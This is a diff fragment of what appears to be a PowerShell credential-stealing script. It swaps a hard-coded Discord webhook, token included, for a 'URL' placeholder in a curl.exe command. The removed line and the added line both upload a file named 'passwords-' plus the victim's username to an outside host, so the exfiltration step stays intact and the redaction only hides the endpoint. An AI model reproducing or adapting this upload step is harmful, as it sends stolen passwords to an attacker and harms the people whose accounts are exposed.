@@ -10,7 +10,7 @@ Set-Location C:\fileUp
 
 Start-Sleep -seconds 15
 
-curl.exe -F "payload_json={\`"content\`": \`"\`"}" -F "file=@passwords-$env:UserName$random.txt" https://discord.com/api/webhooks/1374684800430112889/oAzFkhzV7z45YCtLCpG5nUehUawgv4yH4ZnMYljCLt0RNwIJaUjNyQOGZj6AfEP31zBP
+curl.exe -F "payload_json={\`"content\`": \`"\`"}" -F "file=@passwords-$env:UserName$random.txt" URL
 
 Start-Sleep -seconds 1
 
